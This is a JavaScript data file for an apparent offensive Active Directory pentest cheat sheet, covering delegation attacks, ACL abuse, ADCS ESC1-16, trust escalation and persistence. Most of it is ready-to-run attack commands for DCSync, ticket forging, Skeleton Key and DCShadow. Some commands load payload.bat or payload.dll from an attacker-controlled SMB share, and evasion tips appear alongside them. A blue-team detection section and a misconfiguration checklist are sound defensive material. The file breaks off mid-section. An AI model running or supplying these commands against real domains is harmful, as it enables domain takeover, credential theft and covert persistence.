/* ============================================================
   AD ARSENAL — Content Data (Part 2: Sections 11-22)
   ============================================================ */

window.ARSENAL_DATA = window.ARSENAL_DATA.concat([

    // ============================================================
    // SECTION 11: Delegation Attacks
    // ============================================================
    {
        id: 'delegation',
        title: '// Delegation Attacks Deep Dive',
        phase: 'privesc',
        intro: 'Three types of Kerberos delegation and their exploitation paths. RBCD + S4U chains lead to NT hashes.',
        subsections: [
            {
                title: 'Unconstrained Delegation',
                type: 'commands',
                commands: [
                    { tool: 'BloodHound', cmd: 'MATCH (c {unconstraineddelegation:true}) RETURN c', desc: 'Find unconstrained delegation hosts' },
                    { tool: 'Coercer', cmd: 'Coercer -l {{ATTACKER_IP}} -t {{TARGET_DC}} -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}}', desc: 'Coerce DC to authenticate to unconstrained host' },
                    { tool: 'Rubeus', cmd: 'Rubeus.exe dump /user:DC$ /service:krbtgt', desc: 'Extract cached DC TGT from unconstrained host' },
                    { tool: 'impacket', cmd: 'ticketConverter.py ticket.kirbi ticket.ccache', desc: 'Convert kirbi to ccache format' },
                    { tool: 'impacket', cmd: 'KRB5CCNAME=ticket.ccache secretsdump.py -k -no-pass {{DOMAIN}}/Administrator@{{TARGET_DC}}', desc: 'DCSync using stolen DC TGT' }
                ],
                why: 'When a user authenticates to a service with unconstrained delegation, the KDC includes the user\'s full TGT inside the service ticket. The service caches this TGT in memory. By coercing a DC to authenticate to such a host, the DC\'s own TGT gets cached — and a DC\'s TGT can be used for DCSync.'
            },
            {
                title: 'Constrained Delegation',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'findDelegation.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{TARGET_DC}}', desc: 'Find all delegation configurations' },
                    { tool: 'impacket', cmd: 'getST.py -spn CIFS/{{TARGET_HOST}} -impersonate Administrator {{DOMAIN}}/svc_account:{{PASSWORD}} -dc-ip {{TARGET_DC}}', desc: 'S4U2Self + S4U2Proxy to impersonate admin' },
                    { tool: 'Rubeus', cmd: 'Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/{{TARGET_HOST}} /user:svc_account /rc4:{{HASH}}', desc: 'Windows S4U chain via Rubeus' }
                ],
                why: 'The msDS-AllowedToDelegateTo attribute tells the KDC which SPNs this account may request tickets for on behalf of other users. The SPN in the resulting ticket is not encrypted, so you can swap it to target a different service (e.g., change HTTP/ to CIFS/) after issuance.'
            },
            {
                title: 'RBCD (Resource-Based Constrained Delegation)',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'addcomputer.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{TARGET_DC}} -computer-name FAKEPC$ -computer-pass Passw0rd', desc: 'Step 1: Create machine account (MachineAccountQuota=10)' },
                    { tool: 'impacket', cmd: 'rbcd.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{TARGET_DC}} -action write -delegate-from FAKEPC$ -delegate-to {{TARGET_HOST}}$', desc: 'Step 2: Write RBCD attribute on target' },
                    { tool: 'impacket', cmd: 'getST.py {{DOMAIN}}/FAKEPC$:Passw0rd -spn cifs/{{TARGET_HOST}} -impersonate Administrator -dc-ip {{TARGET_DC}}', desc: 'Step 3: S4U2Self + S4U2Proxy as Administrator' },
                    { tool: 'impacket', cmd: 'KRB5CCNAME=Administrator.ccache secretsdump.py -k -no-pass {{TARGET_HOST}}', desc: 'Step 4: Use ticket → dump secrets' }
                ],
                why: 'Unlike constrained delegation (configured on the DC), RBCD is configured on the target itself via msDS-AllowedToActOnBehalfOfOtherIdentity. Anyone who can write this attribute can authorize their own machine to impersonate users to the target.'
            }
        ]
    },

    // ============================================================
    // SECTION 12: ACL Abuse Paths
    // ============================================================
    {
        id: 'acl-abuse',
        title: '// ACL Abuse Paths',
        phase: 'privesc',
        intro: 'Access Control Entries are the building blocks of AD permissions. Each ACE type has specific exploitation techniques.',
        subsections: [
            {
                title: 'ForceChangePassword',
                type: 'commands',
                commands: [
                    { tool: 'net', cmd: 'net rpc password targetuser -U {{DOMAIN}}/{{USERNAME}}%{{PASSWORD}} -S {{TARGET_DC}}', desc: 'Force reset user password without knowing current password' }
                ],
                notes: ['Warning: Blocks the user — never use without authorization']
            },
            {
                title: 'GenericWrite',
                type: 'commands',
                commands: [
                    { tool: 'certipy', cmd: 'certipy shadow auto -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -account targetuser', desc: 'Shadow Credentials → write msDS-KeyCredentialLink → get NT hash' },
                    { tool: 'targetedKerberoast', cmd: 'targetedKerberoast.py -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} --dc-ip {{TARGET_DC}}', desc: 'Set SPN on target → request TGS → crack offline' }
                ],
                why: 'GenericWrite lets you modify non-protected attributes. Shadow Credentials works because Windows Hello for Business uses msDS-KeyCredentialLink for passwordless auth — writing your own key pair makes the KDC issue you a TGT.'
            },
            {
                title: 'WriteDACL',
                type: 'commands',
                commands: [
                    { tool: 'dacledit', cmd: 'dacledit.py -action write -rights FullControl -principal {{USERNAME}} -target targetuser {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{TARGET_DC}}', desc: 'Grant yourself FullControl on target → then DCSync / GenericAll' }
                ],
                why: 'The DACL defines who can do what on an AD object. WriteDACL lets you edit these permissions — so you can grant yourself FullControl or DCSync rights.'
            },
            {
                title: 'WriteOwner / GenericAll',
                type: 'commands',
                commands: [
                    { tool: 'owneredit', cmd: 'owneredit.py -action write -owner {{USERNAME}} -target targetuser {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{TARGET_DC}}', desc: 'Change owner → then WriteDACL → FullControl' },
                    { tool: 'bloodyAD', cmd: 'bloodyAD -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} --host {{TARGET_DC}} add groupMember "Domain Admins" {{USERNAME}}', desc: 'GenericAll on group: Add yourself' }
                ],
                notes: [
                    'GenericAll on user: Change password, set SPN, shadow creds',
                    'GenericAll on computer: RBCD, read LAPS, shadow creds on machine',
                    'GenericAll on domain: DCSync (DS-Replication-Get-Changes-All)'
                ]
            },
            {
                title: 'GenericWrite → scriptPath Hijack',
                type: 'commands',
                commands: [
                    { tool: 'bloodyAD', cmd: 'bloodyAD -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} --host {{TARGET_DC}} set object targetUser scriptPath -v \'\\\\{{ATTACKER_IP}}\\share\\payload.bat\'', desc: 'Set logon script to attacker-controlled SMB share' }
                ],
                notes: ['Script executes in user\'s context at next logon', 'OPSEC: User sees the script execute — keep it fast and silent']
            },
            {
                title: 'GenericAll on Computer → Silver Ticket',
                type: 'commands',
                commands: [
                    { tool: 'net', cmd: 'net rpc password \'TARGET$\' -U {{DOMAIN}}/{{USERNAME}}%{{PASSWORD}} -S {{TARGET_DC}}', desc: 'Reset machine password' },
                    { tool: 'impacket', cmd: 'ticketer.py -nthash {{HASH}} -domain-sid S-1-5-21-XXXXX -domain {{DOMAIN}} -spn cifs/{{TARGET_HOST}} Administrator', desc: 'Forge Silver Ticket for any service' }
                ],
                notes: ['Warning: Machine password change may break AD trust — re-join may be needed']
            },
            {
                title: 'WriteDACL on OU → Inheritance (OUned)',
                type: 'commands',
                commands: [
                    { tool: 'dacledit', cmd: 'dacledit.py -action write -rights FullControl -inheritance -principal {{USERNAME}} -target \'OU=Servers\' {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{TARGET_DC}}', desc: 'Grant FullControl with inheritance on OU → control all child objects' }
                ]
            },
            {
                title: 'DnsAdmins → DLL Injection on DC',
                type: 'commands',
                commands: [
                    { tool: 'dnscmd', cmd: 'dnscmd {{TARGET_DC}} /config /serverlevelplugindll \\\\{{ATTACKER_IP}}\\share\\payload.dll', desc: 'Load arbitrary DLL into DNS service on DC (runs as SYSTEM)' }
                ],
                notes: ['Requires DNS service restart', 'OPSEC: Very noisy — DNS outage if DLL crashes']
            },
            {
                title: 'ReadLAPSPassword',
                type: 'commands',
                commands: [
                    { tool: 'ldeep', cmd: 'ldeep ldap -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} -s ldap://{{TARGET_DC}} laps', desc: 'Read LAPS local admin passwords from AD' },
                    { tool: 'netexec', cmd: 'netexec ldap {{TARGET_DC}} -u {{USERNAME}} -p {{PASSWORD}} --laps', desc: 'Read LAPS passwords via netexec' }
                ],
                notes: ['Legacy LAPS: ms-Mcs-AdmPwd (cleartext)', 'Windows LAPS: ms-LAPS-Password (encrypted)']
            },
            {
                title: 'ReadGMSAPassword',
                type: 'commands',
                commands: [
                    { tool: 'gMSADumper', cmd: 'gMSADumper.py -u {{USERNAME}} -p {{PASSWORD}} -d {{DOMAIN}} -dc-ip {{TARGET_DC}}', desc: 'Dump gMSA account NT hash' },
                    { tool: 'bloodyAD', cmd: 'bloodyAD -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} --host {{TARGET_DC}} get object \'gMSA$\' --attr msDS-ManagedPassword', desc: 'Read gMSA managed password attribute' }
                ],
                notes: ['gMSAs often run critical services with high privileges']
            },
            {
                title: 'WriteSPN (Targeted Kerberoasting)',
                type: 'commands',
                commands: [
                    { tool: 'bloodyAD', cmd: 'bloodyAD -d {{DOMAIN}} -u {{USERNAME}} -p {{PASSWORD}} --host {{TARGET_DC}} set object targetuser servicePrincipalName -v \'MSSQLSvc/fake:1433\'', desc: 'Step 1: Set fake SPN on target user' },
                    { tool: 'impacket', cmd: 'GetUserSPNs.py -request -dc-ip {{TARGET_DC}} {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}}', desc: 'Step 2: Request TGS for the SPN' },
                    { tool: 'hashcat', cmd: 'hashcat -m 13100 tgs_hash.txt wordlist.txt', desc: 'Step 3: Crack TGS hash offline' }
                ],
                notes: ['Step 4: Clean up — remove SPN to avoid detection']
            }
        ]
    },

    // ============================================================
    // SECTION 13: ADCS ESC1-ESC16
    // ============================================================
    {
        id: 'adcs',
        title: '// ADCS Exploitation — ESC1 through ESC16',
        phase: 'privesc',
        intro: 'Active Directory Certificate Services provides the richest privilege escalation surface in modern AD. Every ESC explained individually.',
        subsections: [
            {
                title: 'ESC1 — Misconfigured Template (SAN)',
                type: 'commands',
                commands: [
                    { tool: 'certipy', cmd: 'certipy find -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -dc-ip {{TARGET_DC}} -vulnerable', desc: 'Enumerate vulnerable ADCS templates' },
                    { tool: 'certipy', cmd: 'certipy req -ca {{CA_NAME}} -template VulnTemplate -upn administrator@{{DOMAIN}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -dc-ip {{TARGET_DC}}', desc: 'Request cert as administrator via SAN' },
                    { tool: 'certipy', cmd: 'certipy auth -pfx administrator.pfx -dc-ip {{TARGET_DC}}', desc: 'Authenticate with cert → get NT hash via PKINIT' }
                ],
                why: 'The ENROLLEE_SUPPLIES_SUBJECT flag lets the requester specify any SAN. The CA trusts the template config and issues a cert with the attacker-supplied identity.'
            },
            {
                title: 'ESC2 — Any Purpose / SubCA EKU',
                type: 'list',
                items: [
                    'Template has Any Purpose (2.5.29.37.0) or SubCA EKU — both allow Client Authentication',
                    'SubCA certificates can issue subordinate certificates (extremely dangerous)',
                    'Difference from ESC1: No SAN control needed — the EKU itself is the problem',
                    'Mitigation: Replace Any Purpose with specific EKUs, never grant SubCA to low-priv users'
                ]
            },
            {
                title: 'ESC3 — Enrollment Agent Abuse',
                type: 'list',
                items: [
                    'Step 1: Enroll in template with Certificate Request Agent EKU (OID 1.3.6.1.4.1.311.20.2.1)',
                    'Step 2: Use that cert to co-sign enrollment requests on behalf of other users',
                    'Two templates needed: One with Request Agent EKU + one that accepts agent enrollment',
                    'Mitigation: Restrict enrollment agent templates, configure enrollment restrictions on CA'
                ]
            },
            {
                title: 'ESC4 — Writable Template',
                type: 'commands',
                commands: [
                    { tool: 'certipy', cmd: 'certipy template -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -template VulnTemplate -save-old -alt-name administrator -dc-ip {{TARGET_DC}}', desc: 'Modify template to enable ESC1 → request as admin' }
                ],
                notes: ['After exploitation, restore template with -configuration old.json', 'Detection: Event 5136 modifying cert template objects']
            },
            {
                title: 'ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2',
                type: 'commands',
                commands: [
                    { tool: 'certipy', cmd: 'certipy req -ca {{CA_NAME}} -template User -upn administrator@{{DOMAIN}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -dc-ip {{TARGET_DC}}', desc: 'SAN override on any template (when EDITF flag is set on CA)' }
                ],
                notes: ['Effectively turns every template into ESC1', 'Largely patched: May 2022 — but still found unpatched']
            },
            {
                title: 'ESC7 — ManageCA / ManageCerts Permissions',
                type: 'commands',
                commands: [
                    { tool: 'certipy', cmd: 'certipy ca -ca {{CA_NAME}} -add-officer {{USERNAME}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -dc-ip {{TARGET_DC}}', desc: 'Add yourself as officer (requires ManageCA)' },
                    { tool: 'certipy', cmd: 'certipy ca -ca {{CA_NAME}} -issue-request 123 -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -dc-ip {{TARGET_DC}}', desc: 'Approve pending Certificate request' }
                ],
                notes: ['Chain: ManageCA → add officer → submit admin cert request → approve it yourself']
            },
            {
                title: 'ESC8 — NTLM Relay to Web Enrollment',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'ntlmrelayx.py --target http://{{CA_NAME}}/certsrv/ --adcs --template DomainController', desc: 'Relay coerced NTLM auth to CA web enrollment' },
                    { tool: 'PetitPotam', cmd: 'PetitPotam.py {{ATTACKER_IP}} {{TARGET_DC}} -u {{USERNAME}} -p {{PASSWORD}}', desc: 'Coerce DC to authenticate to attacker (trigger for relay)' }
                ],
                why: 'HTTP has no signing mechanism. The CA accepts relayed NTLM auth as legitimate and issues a certificate to whoever authenticated — including a DC whose auth was relayed.',
                notes: ['Full chain: Coerce DC → relay to CA → get DC cert → PKINIT → DCSync']
            },
            {
                title: 'ESC9 — No Security Extension (Template)',
                type: 'list',
                items: [
                    'Template has CT_FLAG_NO_SECURITY_EXTENSION flag — cert does not embed requester\'s SID',
                    'Without security extension, cert-to-user mapping relies on UPN/DNS name only',
                    'Attack: GenericWrite on target → change UPN → request cert → restore UPN → auth as target',
                    'Requires: GenericWrite on target user + template without security extension',
                    'Mitigation: Ensure templates include szOID_NTDS_CA_SECURITY_EXT'
                ]
            },
            {
                title: 'ESC10 — Weak Certificate Mapping',
                type: 'list',
                items: [
                    'StrongCertificateBindingEnforcement = 0 on DC — weak mapping accepted',
                    'CertificateMappingMethods contains 0x4 (UPN mapping) — allows impersonation',
                    'Attack: GenericWrite on user → change UPN → request cert → auth as that user',
                    'Mitigation: Set StrongCertificateBindingEnforcement = 2, remove weak mapping methods'
                ]
            },
            {
                title: 'ESC11 — NTLM Relay to RPC Enrollment',
                type: 'commands',
                commands: [
                    { tool: 'certipy', cmd: 'certipy relay -ca {{CA_NAME}} -template DomainController', desc: 'Relay to RPC enrollment endpoint (when IF_ENFORCEENCRYPTICERTREQUEST = 0)' }
                ],
                notes: ['Targets RPC interface, not HTTP — relevant when HTTP enrollment is disabled']
            },
            {
                title: 'ESC13 — Issuance Policy → Group',
                type: 'list',
                items: [
                    'Issuance policy OID linked to AD group via msDS-OIDToGroupLink',
                    'When cert with that policy is used for auth, user is added to linked group for that session',
                    'If linked group is Domain Admins → instant privilege escalation',
                    'Mitigation: Audit msDS-OIDToGroupLink attributes, restrict enrollment on policy-linked templates'
                ]
            },
            {
                title: 'ESC14 — Explicit Certificate Mapping',
                type: 'list',
                items: [
                    'Certificate-to-account mapping stored in altSecurityIdentities attribute on user objects',
                    'If attacker can modify altSecurityIdentities on target → map their own cert to that account',
                    'Attack: Request any cert → write its mapping to target → auth as target',
                    'Mitigation: Restrict write access on altSecurityIdentities, use strong mapping formats'
                ]
            },
            {
                title: 'ESC15 (EKUwu) — Schema v1 App Policy',
                type: 'commands',
                commands: [
                    { tool: 'certipy', cmd: 'certipy req --application-policies "Client Authentication" -template WebServer -upn administrator@{{DOMAIN}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}} -ca {{CA_NAME}} -dc-ip {{TARGET_DC}}', desc: 'Inject Client Auth into v1 template (WebServer) → DA cert' }
                ],
                why: 'Schema v1 templates predate Application Policy validation. AD CS does not validate the OID field — attackers inject Client Auth EKU into templates that only allow Server Auth.'
            },
            {
                title: 'ESC16 — No Security Extension (CA-wide)',
                type: 'list',
                items: [
                    'CA configured to not include security extension in all issued certificates',
                    'Same impact as ESC9 but affects ALL templates on that CA',
                    'Mitigation: Enable security extension at CA level, ensure SID is embedded in all certs'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 14: Trust Escalation, SCCM, ADIDNS
    // ============================================================
    {
        id: 'trust-escalation',
        title: '// Trust Escalation • SCCM Attacks • ADIDNS Poisoning',
        phase: 'dominance',
        intro: 'Cross-domain and cross-forest attack paths, SCCM exploitation, and DNS poisoning techniques.',
        subsections: [
            {
                title: 'Child → Parent (3 methods)',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'raiseChild.py {{DOMAIN}}/{{USERNAME}}:{{PASSWORD}} -dc-ip {{TARGET_DC}}', desc: 'One command — auto golden + ExtraSID -519 → Enterprise Admin' },
                    { tool: 'impacket', cmd: 'ticketer.py -nthash KRBTGT_HASH -domain-sid CHILD-SID -domain {{DOMAIN}} -extra-sid PARENT-SID-519 Administrator', desc: 'Manual Golden Ticket with ExtraSID injection' }
                ],
                notes: [
                    'Trust Ticket: Extract trust key (PARENTDOMAIN$) → forge inter-realm TGT → works after krbtgt rotation',
                    'Unconstrained Deleg: Coerce parent DC to child deleg host → steal TGT'
                ]
            },
            {
                title: 'Forest → Forest Lateral',
                type: 'list',
                items: [
                    'Password reuse: Dump NTDS → spray hashes on external forest',
                    'Foreign groups: Users from Forest A in Forest B groups',
                    'SID History: If TREAT_AS_EXTERNAL — SID history attacks work across forests'
                ]
            },
            {
                title: 'SCCM Attack Matrix',
                type: 'list',
                items: [
                    'CRED: NAA creds, task sequence secrets, PXE boot, collection variables',
                    'ELEVATE: Client push coercion → relay | Site server NTLM relay',
                    'EXEC: Deploy apps / run scripts on managed endpoints',
                    'TAKEOVER: Relay to SMS Provider / MSSQL → full SCCM control',
                    'Tools: sccmhunter • SharpSCCM • SCCMSecrets.py • pxethief • SCCMDecryptor-BOF'
                ]
            },
            {
                title: 'ADIDNS Time Bombs & Poisoning',
                type: 'commands',
                commands: [
                    { tool: 'dnstool', cmd: 'dnstool.py -u {{DOMAIN}}\\{{USERNAME}} -p {{PASSWORD}} -a add -r \'*.{{DOMAIN}}\' -d {{ATTACKER_IP}} {{TARGET_DC}}', desc: 'Inject wildcard DNS record → catch unresolved names' }
                ],
                notes: ['Combine with Responder / ntlmrelayx for capture and relay', 'Time Bombs: Pre-register predictable future hostnames → MITM on domain join']
            }
        ]
    },

    // ============================================================
    // SECTION 15: Tool Arsenal
    // ============================================================
    {
        id: 'tool-arsenal',
        title: '// Key Attributes & Tool Arsenal',
        phase: 'info',
        intro: 'Critical AD attributes and the essential tool arsenal for every phase of an AD pentest.',
        subsections: [
            {
                title: 'Critical AD Attributes',
                type: 'diagram',
                tool: 'REFERENCE',
                content: `ATTRIBUTE                                          PURPOSE
─────────────────────────────────────────────────────────────────
userAccountControl TRUSTED_FOR_DELEGATION          Unconstrained delegation
userAccountControl TRUSTED_TO_AUTH_FOR_DELEG        Constrained w/ proto transition
msDS-AllowedToDelegateTo                           Constrained delegation targets
msDS-AllowedToActOnBehalfOfOtherIdentity           RBCD config
msDS-KeyCredentialLink                             Shadow Credentials (WHfB key)
ms-Mcs-AdmPwd                                     LAPS password (legacy)
servicePrincipalName                               Kerberoasting target
userAccountControl DONT_REQ_PREAUTH                AS-REP roastable
msPKI-Certificate-Name-Flag                        ESC1 flag
altSecurityIdentities                              Cert-to-user binding
sIDHistory                                         Cross-domain privesc via SIDs`
            },
            {
                title: 'Enumeration Tools',
                type: 'diagram',
                tool: 'TOOLS',
                content: `BloodHound + SharpHound / bloodhound-python        AD graph mapping
CrackMapExec / netexec                              Swiss army knife
certipy find                                        ADCS enum
sccmhunter                                          SCCM/MECM enum
ldeep / findDelegation.py                           LDAP + delegation enum
ShadowHound                                         PowerShell AD enum (no binary)
SilentHound                                         Stealthy LDAP-based enum
BOFHound                                            BloodHound via BOF LDAP queries
Adalanche                                           AD ACL visualization
RustHound-CE                                        Rust-based BH collector`
            },
            {
                title: 'Exploitation Tools',
                type: 'diagram',
                tool: 'TOOLS',
                content: `impacket suite        getST, secretsdump, ntlmrelayx, ticketer, raiseChild
certipy               ADCS ESC1-16
Rubeus                Kerberos abuse (Windows)
Coercer / PetitPotam  Auth coercion
dacledit / owneredit  ACL abuse
rbcd.py / addcomputer RBCD + machine accounts
targetedKerberoast    GenericWrite → Kerberoast
DonPAPI / dploot      DPAPI secrets`
            },
            {
                title: 'BloodHound Key Cypher Queries',
                type: 'commands',
                commands: [
                    { tool: 'BloodHound', cmd: 'MATCH (c1:Computer)-[:MemberOf*1..]->(g:Group) WHERE g.objectid ENDS WITH \'-516\' WITH COLLECT(c1.name) AS dcs MATCH (c2 {unconstraineddelegation:true}) WHERE NOT c2.name IN dcs RETURN c2', desc: 'Find unconstrained delegation (non-DC)' },
                    { tool: 'BloodHound', cmd: 'MATCH p=(u)-[:AllowedToDelegate]->(c) RETURN p', desc: 'Find all constrained delegation' },
                    { tool: 'BloodHound', cmd: 'MATCH p=(u)-[r1]->(n) WHERE r1.isacl=true AND u.admincount=false RETURN p', desc: 'ACL abuse paths from non-admin users' },
                    { tool: 'BloodHound', cmd: 'MATCH p=shortestPath((u:User {owned:true})-[*1..]->(g:Group {name:"DOMAIN ADMINS@{{DOMAIN}}"})) RETURN p', desc: 'Shortest path from owned users to DA' }
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 16: Detection / Blue Team
    // ============================================================
    {
        id: 'detection',
        title: '// Detection / Blue Team Indicators',
        phase: 'defense',
        intro: 'Key Windows Event IDs and detection strategies for AD attacks. Essential for purple team exercises.',
        subsections: [
            {
                title: 'Critical Event IDs',
                type: 'diagram',
                tool: 'REFERENCE',
                content: `EVENT ID  SOURCE      DETECTS
──────────────────────────────────────────────────────
4768      Security    TGT requested (AS-REQ)         → AS-REP Roasting
4769      Security    TGS requested                  → Kerberoasting (RC4)
4771      Security    Kerberos pre-auth failed        → Password spray
4625      Security    Logon failure                   → Password spray (NTLM)
4662      Security    Operation on AD object          → DCSync
4624      Security    Successful logon (Type 3/10)    → Lateral movement, PtH
5136      Security    Directory object modified        → ACL abuse, RBCD, Shadow Creds
5137      Security    Directory object created         → Machine account creation
4742      Security    Computer account changed         → RBCD attribute modification
4887      Security    Certificate requested            → ADCS abuse (ESC1-16)
4886      Security    Certificate issued               → Rogue certificate
1102      Security    Audit log cleared                → Anti-forensics
7045      System      New service installed             → PsExec
4104      PowerShell  Script block logging              → Malicious PowerShell
10        Sysmon      Process access (LSASS)            → Credential dumping`
            },
            {
                title: 'Kerberos Attack Detection',
                type: 'list',
                items: [
                    'Kerberoasting: Event 4769 with Ticket Encryption Type = 0x17 (RC4) for service accounts',
                    'AS-REP Roasting: Event 4768 with Pre-Auth Type = 0 — monitor DONT_REQ_PREAUTH accounts',
                    'Golden Ticket: TGT with unusual lifetime, logon events with no corresponding 4768',
                    'Silver Ticket: Service access with no corresponding 4769 on DC — hardest to detect',
                    'DCSync: Event 4662 with DS-Replication-Get-Changes-All from non-DC source',
                    'Diamond Ticket: Legitimate 4768 but modified PAC — requires PAC inspection'
                ]
            },
            {
                title: 'Lateral Movement Detection',
                type: 'list',
                items: [
                    'Pass-the-Hash: Type 3 logon (4624) with NtLmSsp — especially from unusual sources',
                    'PsExec: Event 7045 (service install) + named pipe creation on target',
                    'WMIExec: WMI activity from unexpected hosts — process creation under wmiprvse.exe',
                    'NTLM Relay: Authentication source/dest mismatch',
                    'Honey tokens: Create decoy accounts with SPNs, DONT_REQ_PREAUTH, or DA group membership'
                ]
            },
            {
                title: 'Privilege Escalation Detection',
                type: 'list',
                items: [
                    'ACL modification: Event 5136 on sensitive objects (AdminSDHolder, Domain Admins)',
                    'RBCD setup: Event 4742/5136 modifying msDS-AllowedToActOnBehalfOfOtherIdentity',
                    'Shadow Credentials: Event 5136 modifying msDS-KeyCredentialLink',
                    'GPO abuse: Event 5136 on GPO objects + SYSVOL file modifications',
                    'ADCS ESC1: Event 4887 with SAN different from requesting user',
                    'Machine account creation: Event 5137 from non-admin users'
                ]
            }
        ]
    },

    // ============================================================
    // SECTION 17: Common Misconfigurations Checklist
    // ============================================================
    {
        id: 'misconfigurations',
        title: '// Common Misconfigurations Checklist',
        phase: 'defense',
        intro: 'The most frequently exploited AD misconfigurations found in real engagements. Use this as an audit checklist.',
        subsections: [
            {
                title: 'AD Security Audit Checklist',
                type: 'diagram',
                tool: 'CHECKLIST',
                content: `CATEGORY            MISCONFIGURATION                            RISK
─────────────────────────────────────────────────────────────────────
KERBEROS
├── DONT_REQ_PREAUTH on accounts                    AS-REP Roasting
├── SPNs on user accounts (not machine)             Kerberoasting
├── krbtgt password never rotated                   Golden Ticket persistence
├── Unconstrained delegation on non-DC              TGT theft via coercion
└── RC4 encryption still enabled                    Faster hash cracking

NTLM
├── SMB signing not required on all hosts           NTLM relay attacks
├── LDAP signing not required                       NTLM relay to LDAP
├── LDAP channel binding not required               NTLM relay to LDAPS
├── NTLMv1 allowed (LMCompatibilityLevel < 3)       Trivial hash cracking
└── Extended Protection for Auth disabled           Relay to HTTPS/LDAPS

ADCS
├── Templates with ENROLLEE_SUPPLIES_SUBJECT        ESC1 → DA
├── HTTP enrollment without EPA                     ESC8 → DC cert
├── Schema v1 templates still active                ESC15 → DA
├── Low-priv users with ManageCA/ManageCerts         ESC7 → approve certs
└── Write access on certificate templates           ESC4 → modify to ESC1

ACL / PERMISSIONS
├── GenericAll / WriteDACL on sensitive objects      Full control → DCSync
├── Non-admin users with DCSync rights              Dump all hashes
├── MachineAccountQuota > 0 (default = 10)          RBCD attacks
├── Pre-Windows 2000 Compatible Access group        Anonymous enum
└── AdminSDHolder ACL not monitored                 Persistent access

CREDENTIAL HYGIENE
├── No LAPS deployed                                Lateral movement via local admin
├── Service accounts with weak passwords            Kerberoast + crack
├── Privileged accounts on workstations             Credential theft from LSASS
├── WDigest enabled (UseLogonCredential = 1)        Plaintext in LSASS
├── GPP passwords in SYSVOL (MS14-025)              Public key = cleartext
└── Password reuse between admin tiers              Tier 0 from Tier 1/2

NETWORK / SERVICES
├── Print Spooler running on DCs                    PrinterBug coercion
├── LLMNR / NBT-NS / mDNS enabled                  Credential capture
├── IPv6 enabled without DHCPv6 security            mitm6 DNS takeover
├── Auth users can create DNS records               ADIDNS poisoning
└── Default SCCM NAA with domain creds              NAA credential extraction`
            }
        ]
    },

    // ============================================================
    // SECTION 18: Persistence Deep Dive
    // ============================================================
    {
        id: 'persistence',
        title: '// Persistence Deep Dive',
        phase: 'persist',
        intro: 'Once you have Domain Admin, how do you maintain access? These techniques survive password resets, ticket rotations, and even some remediation efforts.',
        subsections: [
            {
                title: 'Golden Ticket',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'ticketer.py -nthash KRBTGT_HASH -domain-sid S-1-5-21-XXXXX -domain {{DOMAIN}} Administrator', desc: 'Forge TGT with arbitrary PAC — valid until krbtgt rotated twice' }
                ],
                notes: ['Detection: TGT with no corresponding AS-REQ (4768)', 'Remediation: Reset krbtgt password twice (with delay)']
            },
            {
                title: 'Diamond & Sapphire Tickets',
                type: 'commands',
                commands: [
                    { tool: 'impacket', cmd: 'ticketer.py -request -impersonate Administrator -domain {{DOMAIN}} -user {{USERNAME}} -password {{PASSWORD}} -nthash KRBTGT_HASH', desc: 'Diamond Ticket — modify legitimate TGT PAC (stealthier)' }
                ],
                notes: ['Has legitimate 4768 events — harder for SOC to detect', 'Sapphire uses S4U2Self+U2U for real PAC data']
            },
            {
                title: 'Golden Certificate',
                type: 'commands',
                commands: [
                    { tool: 'certipy', cmd: 'certipy ca -backup -ca {{CA_NAME}} -u {{USERNAME}}@{{DOMAIN}} -p {{PASSWORD}}', desc: 'Backup CA private key' },
                    { tool: 'certipy', cmd: 'certipy forge -ca-pfx ca.pfx -upn administrator@{{DOMAIN}} -subject "CN=Administrator"', desc: 'Forge certificate for any user — valid for years' }
                ],
                notes: ['Survives password resets, krbtgt rotations, account disabling', 'Remediation: Revoke CA cert, rebuild entire PKI — extremely painful']
            },
            {
                title: 'Skeleton Key',
                type: 'commands',
                commands: [
                    { tool: 'Mimikatz', cmd: 'misc::skeleton', desc: 'Inject backdoor into LSASS — master password "mimikatz" for any account' }
                ],
                notes: ['Only in-memory — lost on DC reboot', 'Must be injected on every DC individually', 'Original passwords continue to work']
            },
            {
                title: 'DCShadow',
                type: 'commands',
                commands: [
                    { tool: 'Mimikatz', cmd: 'lsadump::dcshadow /object:targetuser /attribute:SIDHistory /value:S-1-5-21-XXXXX-519', desc: 'Register as DC → push arbitrary AD modifications via replication' }
                ],
                notes: ['Modify ACLs, SPNs, group memberships without standard audit logs', 'Requires DA/SYSTEM on domain-joined machine']
            },
            {
                title: 'DSRM Backdoor',
                type: 'list',
                items: [
                    'Every DC has a local DSRM Administrator account (set during dcpromo)',
                    'Set registry: DsrmAdminLogonBehavior = 2 → allows DSRM logon over network',
                    'Use DSRM hash for Pass-the-Hash to DC — independent of domain admin passwords',
